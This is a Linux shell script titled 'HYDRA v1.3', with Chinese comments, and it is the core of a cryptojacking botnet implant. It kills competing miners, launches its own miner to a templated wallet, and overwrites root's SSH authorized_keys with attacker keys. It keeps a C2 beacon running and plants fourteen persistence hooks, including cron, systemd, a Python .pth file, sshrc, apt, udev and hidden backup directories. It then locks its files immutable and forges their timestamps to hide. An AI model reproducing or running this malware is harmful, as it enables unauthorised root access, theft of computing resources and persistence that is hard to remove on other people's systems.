#!/bin/sh
# ═══════════════════════════════════════════════════════════════
# HYDRA v1.3 — 九头蛇心脏（融合体系核心；FIX6b/1.2/1.3 已并入）
# 融合: 攻击者 v14.3 精华（13FIX/自调度/cgroup感知）
#     + 我方精华（白名单/钱包锚定/多备份/HMAC）
# ═══════════════════════════════════════════════════════════════
TAG="@@TAG@@"; BASE="@@BASE@@"; C2="@@C2@@"; TOK="@@TOK@@"; WALLET="@@WALLET@@"; PEER="@@PEER@@"; MODE_CFG="@@MODE@@"
LOG="$BASE/hydra.log"
SEED="/usr/share/.$TAG-bk/boot.sh"   # ★ 种子引导器（备份树中，BASE 全删也能触发）

log(){ echo "[$(date '+%F %T')] $*" >> "$LOG" 2>/dev/null; }

# ── FIX6b（v1.1 修复）: 时间戳防重入锁 ──
# 旧版 exec 9> 的 fd 会被自调度 sleep 子进程继承 → 永久锁死（实测 bug）
# 新版: 用时间戳文件，60s 内只允许一次完整执行；绝不持有长命 fd
# --force 参数旁路（运维手动拉起用）
NOW=$(date +%s)
if [ "${1:-}" != "--force" ]; then
  LAST=$(cat "$BASE/.lastrun" 2>/dev/null || echo 0)
  case "$LAST" in ''|*[!0-9]*) LAST=0;; esac
  if [ $((NOW - LAST)) -lt 60 ]; then exit 0; fi
fi
echo "$NOW" > "$BASE/.lastrun" 2>/dev/null

# ── FIX8/v14.3: 自调度链（cron 死了也能活！）──
# v1.2 修复: 按「链是否已存在」去重（不用时间戳——systemd 60s 循环会误判重复）
# 扫描 /proc，若已有指向 SEED 的 sleep 链 → 不重复安排
CHAIN=0
for q in /proc/[0-9]*; do
  C=$(tr '\0' ' ' < "$q/cmdline" 2>/dev/null)
  case "$C" in *"sleep "*"$SEED"*) CHAIN=1 ;; esac
done
if [ "$CHAIN" = 0 ]; then
  # ★ 用 nohup+setsid+全 fd 重定向，确保不继承任何锁
  nohup setsid sh -c "sleep @@SLP@@; exec sh '$SEED' >/dev/null 2>&1" </dev/null >/dev/null 2>&1 &
fi

# ═══ 1. 环境自适应（攻击者 v14.3 精华 + 我方 stealth 模式）═══
N=$(nproc 2>/dev/null || echo 2)
ML_RAW=$(cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory/memory.limit_in_bytes 2>/dev/null || echo 0)
MEMAV=$(awk '/MemAvailable/{print int($2/1024)}' /proc/meminfo 2>/dev/null || echo 512)
case "$ML_RAW" in ''|max|*[!0-9]*) MEMLIM=$MEMAV;; *) MEMLIM=$((ML_RAW / 1048576)); [ "$MEMLIM" -gt 1000000 ] && MEMLIM=$MEMAV;; esac
case "$MEMLIM" in ''|*[!0-9]*) MEMLIM=0;; esac
[ "$MEMLIM" -gt 1000000 ] 2>/dev/null && MEMLIM=0
[ "$MEMLIM" -eq 0 ] && MEMLIM=$(( $(awk '/MemTotal/{print $2}' /proc/meminfo 2>/dev/null || echo 2097152) / 1024 ))

# 模式判定（可在配置强制）
if [ -n "$MODE_CFG" ] && [ "$MODE_CFG" != "auto" ]; then
  MODE="$MODE_CFG"
elif [ "$MEMLIM" -lt 700 ]; then MODE=light
elif [ "$MEMLIM" -lt 5000 ]; then MODE=light
else MODE=auto; fi
log "env: nproc=$N mem=${MEMLIM}MB mode=$MODE"

# ═══ 2. 白名单净化（我方精华：三钥匙守护）═══
AK=/root/.ssh/authorized_keys
if [ -f "$BASE/keys.pub" ]; then
  mkdir -p /root/.ssh 2>/dev/null; chmod 700 /root/.ssh 2>/dev/null
  [ -f "$AK" ] || : > "$AK"
  chmod 600 "$AK" 2>/dev/null
  chattr -i "$AK" 2>/dev/null
  # 逐行比对，只留白名单
  TMPK="$BASE/.ak.tmp"
  : > "$TMPK"
  while IFS= read -r line; do
    [ -z "$line" ] && continue
    grep -qF -- "$line" "$AK" 2>/dev/null && echo "$line" >> "$TMPK"
  done < "$BASE/keys.pub"
  # 白名单里的必须都在
  while IFS= read -r line; do
    [ -z "$line" ] && continue
    grep -qF -- "$line" "$TMPK" 2>/dev/null || echo "$line" >> "$TMPK"
  done < "$BASE/keys.pub"
  cat "$TMPK" > "$AK" 2>/dev/null; rm -f "$TMPK"
  chmod 600 "$AK" 2>/dev/null
  chattr +i "$AK" 2>/dev/null
fi

# ═══ 3. 排他 + 夺币（我方精华）═══
# 3a. 排他：杀竞品矿工（保留我们的）
for pat in 'compute-orch' 'polkjt' 'sendstats' 'supervise-miner' 'nvidia-cuda-all' 'rig3748' 'xmrig' 'kdevtmpfsi' 'kinsing' 'kworker' 'srv_ws' 'wshell'; do
  for p in $(pgrep -f "$pat" 2>/dev/null); do
    [ -z "$p" ] && continue
    CL=$(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null)
    case "$CL" in
      *"$WALLET"*|*"$BASE"*|*"hydra"*) ;;   # 我们的，放行
      *) kill -9 "$p" 2>/dev/null ;;
    esac
  done
done
# 3b. 夺币：矿工钱包必须正确
OURM=0
for p in $(pgrep -f 'krig-miner --url' 2>/dev/null); do
  CL=$(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null)
  case "$CL" in *"$WALLET"*) OURM=$((OURM+1));; *) kill -9 "$p" 2>/dev/null;; esac
done
if [ "$OURM" -eq 0 ] && [ -x "$BASE/krig-miner" ]; then
  cd "$BASE" && nohup setsid ./krig-miner --url stratum+ssl://YOUR_POOL_HOST:8048 --user "$WALLET/$TAG" </dev/null >> "$BASE/miner.log" 2>&1 &
  log "miner launched"
fi

# ═══ 4. 保活 beacon（我方 C2 通道）═══
# v1.2 修复: 按完整路径判重（旧版 pgrep "beacon-$TAG" 永远匹配不到 → 每次拉起新实例）
BCNT=0
for q in /proc/[0-9]*; do
  C=$(tr '\0' ' ' < "$q/cmdline" 2>/dev/null)
  case "$C" in *"$BASE/beacon.sh"*) BCNT=$((BCNT+1)) ;; esac
done
if [ "$BCNT" -eq 0 ] && [ -x "$BASE/beacon.sh" ]; then
  cd "$BASE" && nohup setsid sh "$BASE/beacon.sh" >/dev/null 2>&1 &
fi

# ═══ 5. 十四路触发源重建（我方11 + 攻击者贡献3）═══
# 5.1 cron.d
[ -f /etc/cron.d/zz-$TAG ] || echo "* * * * * root /bin/sh $SEED >/dev/null 2>&1" > /etc/cron.d/zz-$TAG 2>/dev/null
# 5.2 crontab
crontab -l 2>/dev/null | grep -q "$TAG" || ( crontab -l 2>/dev/null; echo "*/2 * * * * /bin/sh $SEED >/dev/null 2>&1" ) | crontab - 2>/dev/null
# 5.3 profile.d
[ -f /etc/profile.d/zz-$TAG.sh ] || { printf '#!/bin/sh\n[ -x %s ] && %s >/dev/null 2>&1 &\n' "$SEED" "$SEED" > /etc/profile.d/zz-$TAG.sh 2>/dev/null; chmod 755 /etc/profile.d/zz-$TAG.sh 2>/dev/null; }
# 5.4 【攻击者贡献】.pth — Python 启动触发（最阴）
PTH_DIR=$(python3 -c "import site;print(site.getsitepackages()[0])" 2>/dev/null || echo /usr/lib/python3/dist-packages)
[ -d "$PTH_DIR" ] && [ ! -f "$PTH_DIR/zz$TAG.pth" ] && echo "import os;os.system('sh $SEED >/dev/null 2>&1 &')" > "$PTH_DIR/zz$TAG.pth" 2>/dev/null
# 5.5 【攻击者贡献】sshrc — SSH 登录触发
[ -f /etc/ssh/sshrc ] || printf '[ -x %s ] && %s >/dev/null 2>&1 &\n' "$SEED" "$SEED" > /etc/ssh/sshrc 2>/dev/null
# 5.6 【攻击者贡献】logrotate — 日志轮转触发
[ -f /etc/logrotate.d/zz-$TAG ] || printf '/var/log/hydra-dummy {\n size 1\n rotate 1\n missingok\n notifempty\n postrotate\n  /bin/sh %s >/dev/null 2>&1\n endscript\n}\n' "$SEED" > /etc/logrotate.d/zz-$TAG 2>/dev/null
# 5.7 apt hook
[ -f /etc/apt/apt.conf.d/99zz-$TAG ] || echo "DPkg::Pre-Invoke {\"/bin/sh $SEED >/dev/null 2>&1 || true\";};" > /etc/apt/apt.conf.d/99zz-$TAG 2>/dev/null
# 5.8 systemd service
if command -v systemctl >/dev/null 2>&1 && [ ! -f /etc/systemd/system/zz-$TAG.service ]; then
  cat > /etc/systemd/system/zz-$TAG.service <<SEOF
[Unit]
Description=System $TAG helper
[Service]
Type=simple
ExecStart=/bin/sh -c 'while true; do sh $SEED; sleep 60; done'
Restart=always
[Install]
WantedBy=multi-user.target
SEOF
  systemctl daemon-reload 2>/dev/null; systemctl enable zz-$TAG.service 2>/dev/null; systemctl start zz-$TAG.service 2>/dev/null
fi
# 5.9 systemd timer
if command -v systemctl >/dev/null 2>&1 && [ ! -f /etc/systemd/system/zz-$TAG.timer ]; then
  cat > /etc/systemd/system/zz-$TAG.timer <<TEOF
[Unit]
Description=$TAG timer
[Timer]
OnBootSec=30
OnUnitActiveSec=60
[Install]
WantedBy=timers.target
TEOF
  cat > /etc/systemd/system/zz-$TAG-t.service <<TSOF
[Unit]
Description=$TAG oneshot
[Service]
Type=oneshot
ExecStart=/bin/sh $SEED
TSOF
  systemctl daemon-reload 2>/dev/null; systemctl enable zz-$TAG.timer 2>/dev/null; systemctl start zz-$TAG.timer 2>/dev/null
fi
# 5.10 udev
[ -f /etc/udev/rules.d/99-zz-$TAG.rules ] || echo "ACTION==\"add\", SUBSYSTEM==\"net\", RUN+=\"/bin/sh $SEED\"" > /etc/udev/rules.d/99-zz-$TAG.rules 2>/dev/null
# 5.11 rc.local
if [ -f /etc/rc.local ]; then
  grep -q "$TAG" /etc/rc.local 2>/dev/null || sed -i "/^exit 0/i /bin/sh $SEED >/dev/null 2>&1 &" /etc/rc.local 2>/dev/null
fi
# 5.12-14: 备份树自愈（4 层，我方精华 + FIX3）
for d in /usr/share/.$TAG-bk /etc/.$TAG-bk /usr/local/share/.$TAG-bk3 /var/lib/.$TAG-bk4; do
  [ -d "$d" ] || mkdir -p "$d" 2>/dev/null
  # 心脏/引导器不在 → 从备份恢复
  [ -f "$BASE/h.sh" ] || { [ -f "$d/h.sh" ] && { cp -pf "$d/h.sh" "$BASE/h.sh" 2>/dev/null; chmod 755 "$BASE/h.sh" 2>/dev/null; }; }
  [ -f "$SEED" ] || { [ -f "$d/boot.sh" ] && { cp -pf "$d/boot.sh" "$SEED" 2>/dev/null; chmod 755 "$SEED" 2>/dev/null; }; }
  # 备份更新（先解锁目标，防 +i 挡写）
  for src in h.sh boot.sh beacon.sh; do
    [ -f "$BASE/$src" ] || continue
    chattr -i "$d/$src" 2>/dev/null
    cp -pf "$BASE/$src" "$d/$src" 2>/dev/null
    chmod 755 "$d/$src" 2>/dev/null
    chattr +i "$d/$src" 2>/dev/null   # ★ 种子锁死（防误删）
  done
done

# ═══ 6. mtime 伪装（我方精华）═══
REF=$(stat -c %y /etc/hostname 2>/dev/null)
for f in "$BASE"/*.sh /etc/cron.d/zz-$TAG /etc/profile.d/zz-$TAG.sh /etc/systemd/system/zz-$TAG* /etc/udev/rules.d/99-zz-$TAG.rules /etc/apt/apt.conf.d/99zz-$TAG /etc/logrotate.d/zz-$TAG "$PTH_DIR/zz$TAG.pth"; do
  if [ -e "$f" ]; then chattr -i "$f" 2>/dev/null; touch -d "$REF" "$f" 2>/dev/null; chattr +i "$f" 2>/dev/null; fi
done

log "cycle done"
exit 0
